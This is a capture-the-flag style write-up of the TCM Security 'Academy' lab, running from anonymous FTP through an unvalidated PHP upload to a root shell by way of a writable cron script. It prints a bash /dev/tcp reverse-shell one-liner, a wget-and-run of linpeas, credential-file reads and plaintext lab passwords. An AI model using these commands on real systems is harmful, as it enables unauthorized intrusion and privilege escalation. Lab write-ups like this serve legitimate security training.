
# Academy 

**By Stager** | FashilHack

---

## What is this machine

Academy is a capstone lab from TCM Security's Practical Ethical Hacking course. It's a Linux box running a web application for a fictional student portal. The goal is to go from zero access to root — and the path forces you to think the way a real external penetration tester would: enumerate everything before attacking anything, and let the small findings stack up into something big.

This one was satisfying to work through. Every step made sense once you found the next piece.


## Target

```
IP:  172.20.10.4
OS:  Debian Linux (kernel 4.19.0-16-amd64)
```

## Step 1 — Nmap Scan

First thing every time — understand what's running before touching anything.

```bash
nmap -T4 -p- -A 172.20.10.4
```

Three ports:

|Port|Service|Detail|
|---|---|---|
|21|FTP|vsftpd 3.0.3 — anonymous login enabled|
|22|SSH|OpenSSH 7.9p1|
|80|HTTP|Apache 2.4.38|

Port 21 with anonymous login enabled is always worth checking first. That's where I started.

## Step 2 — Anonymous FTP

```bash
ftp 172.20.10.4
# name: anonymous
# password: (blank)

ftp> ls
# note.txt

ftp> get note.txt
ftp> exit

cat note.txt
```
The note was from a developer named `jdelta` — addressed to someone called Heath. He was explaining that Grimmie set up the test website and he couldn't get into the admin panel, so instead he added a student directly via SQL. And then he pasted the raw INSERT statement right there in the note.

That INSERT had everything:
- Student registration number: `10201321`
- Password hash: `cd73502828457d15655bbd7a63fb0bc8`
- Name: `Rum Ham`

The note even said: "The StudentRegNo number is what you use for login."

That's your credentials handed to you. Onto the web app.

![[stager/writeups/academy/images/academy capstone vm.png]]

## Step 3 — Web Enumeration

Port 80 had the default Apache page. Nothing useful there, so I ran Gobuster to find what was actually hosted:

```bash
gobuster dir -u http://172.20.10.4 \
  -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/big.txt \
  -x php,html,txt
```

Two useful results:

- `/academy` — the student login portal
- `/phpmyadmin` — database management (noted for later)
![[stager/writeups/academy/images/disbuter on academy.png]]

## Step 4 — Login and Reverse Shell Upload
Went to `http://172.20.10.4/academy` — got a student login page. Used the creds from the FTP note:

- **RegNo:** `10201321`
- **Password:** `cd73502828457d15655bbd7a63fb0bc8`

Logged in as Rum Ham. Inside the profile page there was a file upload for a profile photo. No validation on file type — that's the opening.

Set up the listener first:

```bash
nc -lvnp 3333
```

Uploaded `php-shell.php` (configured with my IP `172.20.10.2` and port `3333`). Navigated to the uploaded file. Shell connected back.

```bash
whoami
# www-data
```

Low-privilege shell as the web server user. Not done yet.
![[stager/writeups/academy/images/got a shell in academy.png]]
## Step 5 — Linpeas

Hosted linpeas from Kali and pulled it down to the target:

```bash
# Kali:
python3 -m http.server 80

# Target shell:
cd /tmp
wget http://172.20.10.2/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

linpeas ran and lit up `/home/grimmie/backup.sh` in red. That's the flag. Something about that script matters.
![[stager/writeups/academy/images/run linpeas in academy vm.png]]

## Step 6 — Finding Grimmie's Credentials

Checked `/etc/passwd` to understand the users:

```bash
cat /etc/passwd
```

Found this line:

```
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash
```

So `grimmie` is the administrator. Went to the web app's includes directory — developers often leave config files there:

```bash
cd /var/www/html/academy/includes
cat config.php
```

There it was:

```php
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
```

The note had said Grimmie reuses the same password everywhere. Worth trying on SSH.
![[stager/writeups/academy/images/found admin name and his creds in config file.png]]

## Step 7 — SSH as Grimmie

```bash
ssh grimmie@172.20.10.4
# password: My_V3ryS3cur3_P4ss
```

It worked.

```bash
whoami
# grimmie
```

One user closer to root. Now back to that `backup.sh` file linpeas flagged.
![[stager/writeups/academy/images/login as grimmie admin.png]]

## Step 8 — Root via Cron Job

Read `backup.sh`:
```bash
cat /home/grimmie/backup.sh

#!/bin/bash
rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

It runs on a cron schedule as root. And it's writable. Replaced the entire content with a reverse shell one-liner pointing at a new listener:

```bash
nano backup.sh
# Replaced with:
bash -i >& /dev/tcp/172.20.10.2/8081 0>&1
```

Set up the listener:

```bash
nc -lvnp 8081
```

Waited. The cron ran. Shell came back as root.

```bash
whoami
# root
```

Done.

## The Full Chain

```
Nmap → FTP anonymous login → note.txt (student creds)
  ↓
Web login → file upload → PHP reverse shell → www-data
  ↓
linpeas → backup.sh flagged → config.php found
  ↓
config.php password → SSH as grimmie
  ↓
backup.sh writable + cron as root → replace with reverse shell → root
```

## What I learned from this one

**Anonymous FTP isn't just a "low" finding.** In this case it was the entire starting point. A development note with hardcoded SQL got left on a public FTP share. That's the kind of thing that happens in real environments — someone tests something, forgets to clean up.

**File upload without validation is an immediate shell.** No MIME check, no extension blacklist, nothing. PHP uploaded, executed, done.

**linpeas is worth running every time.** It found the backup script immediately. Without it, manually hunting through cron jobs would have taken much longer.

**The note gave you the ending before you started.** "He reuses the same password everywhere." That's a breadcrumb the developer left in the scenario, but in real life people write this kind of thing in Slack, internal wikis, sticky notes. Pay attention to what you read.

---

_Stager — PNPT Candidate_ _FashilHack — Simulating Attacks, Securing Businesses._